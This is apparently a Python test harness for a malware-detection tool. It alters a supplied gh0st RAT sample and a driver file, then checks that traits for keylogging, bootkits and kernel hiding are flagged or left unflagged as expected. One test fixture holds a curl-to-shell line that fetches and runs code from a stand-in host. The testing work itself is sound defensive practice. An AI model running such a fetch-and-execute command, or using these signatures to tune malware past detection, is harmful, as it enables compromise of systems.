#!/usr/bin/env python3
"""Check carrier/implementation boundaries without executing any sample."""
import argparse
import json
import os
from pathlib import Path
import subprocess

ROOT = Path(__file__).resolve().parents[3]
GHOST = 'well-known/malware/rat/gh0st::gh0st-server-class-layout'
KEYS = 'objectives/collection/keylog/polling::native-xor-key-recording'
CLIP = 'objectives/collection/clipboard/capture::polling-key-recorder-clipboard-copy'
BOOT = 'objectives/persistence/firmware/boot/record::embedded-bios-read-hook-bootkit'
HIDE = 'objectives/evasion/kernel-hide/hook::windows-syscall-directory-result-hiding'
NT = 'micro-behaviors/process/create/exec::nt-create-process-ex-reference'
RUST = 'micro-behaviors/process/create/subprocess::rust-command-path-variable'
PIPE = 'micro-behaviors/process/create/shell/pipeline::spawned-curl-shell-pipeline'
OLD_NT = 'micro-behaviors/process/create/fork::nt-create-process-ex-reference'
OLD_RUST = 'micro-behaviors/process/create/exec::rust-command-path-variable'
LOOP = bytes.fromhex('8a 14 01 80 f2 62 88 10 40 83 ee 01 75 f2')


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--rat', required=True, type=Path)
    p.add_argument('--driver', required=True, type=Path)
    p.add_argument('--scratch', required=True, type=Path)
    p.add_argument('--cleave', default=os.environ.get('CLEAVE', 'cleave'))
    a = p.parse_args()
    a.scratch.mkdir(parents=True, exist_ok=True)
    rat = a.rat.read_bytes()
    assert rat.count(LOOP) == 1
    no_classes = rat
    for cls in [b'CKeyboardManager', b'CScreenManager', b'CShellManager']:
        token = b'.?AV' + cls + b'@@'
        assert token in no_classes
        no_classes = no_classes.replace(token, b'X' * len(token))
    cases = [
        ('renamed.dll', rat, {GHOST, KEYS, CLIP}, {BOOT, HIDE}),
        ('zero-xor.dll', rat.replace(LOOP, LOOP[:5] + b'\0' + LOOP[6:]),
         set(), {GHOST, KEYS, CLIP}),
        ('other-xor.dll', rat.replace(LOOP, LOOP[:5] + b'\x37' + LOOP[6:]),
         {GHOST, KEYS, CLIP}, set()),
        ('no-poll.dll', rat.replace(b'GetAsyncKeyState', b'GetAsyncRowState'),
         set(), {GHOST, KEYS, CLIP}),
        ('five-classes.dll', no_classes, {KEYS, CLIP}, {GHOST}),
        ('carrier.sys', a.driver.read_bytes(), {BOOT, HIDE}, {GHOST, KEYS, CLIP}),
        ('native.c', b'void f(){NtCreateProcessEx(0,0,0,0,0,0,0,0,0);}',
         {NT}, {OLD_NT}),
        ('command.rs', b'fn main(){let child = Command::new(&tool_path);}',
         {RUST}, {OLD_RUST}),
        ('pipeline.rs', b'fn main(){let p="curl https://updates.invalid/run | sh";let child=Command::new(&tool_path);}',
         {RUST, PIPE}, set()),
        ('pipeline-only.rs', b'fn main(){let p="curl https://updates.invalid/run | sh";}',
         set(), {RUST, PIPE}),
        ('literal.rs', b'fn main(){let child = Command::new("tool");}',
         set(), {RUST}),
    ]
    results = []
    for name, content, want, reject in cases:
        path = a.scratch / name
        path.write_bytes(content)
        proc = subprocess.run([a.cleave, '--no-update-check', '--traits-dir', str(ROOT),
            '--format', 'json', str(path)], capture_output=True, text=True, check=True)
        result = json.loads(proc.stdout)
        # Isolated carrier may recursively expose the RAT. Check its own image.
        primary = next(f for f in result['files'] if f['path'] == str(path))
        found = {t['id']: t for t in primary['traits']}
        assert not (want - found.keys()), (name, 'missing', want - found.keys())
        assert not (reject & found.keys()), (name, 'unexpected', reject & found.keys())
        for trait in want & {NT, RUST}:
            assert found[trait]['crit'] == 3, (name, trait, found[trait]['crit'])
        results.append({'case': name, 'required': sorted(want), 'rejected': sorted(reject)})
    (a.scratch / 'results.json').write_text(json.dumps(results, indent=2) + '\n')
    print(f'{len(cases)} carrier, recorder, and placement controls passed')


if __name__ == '__main__':
    main()
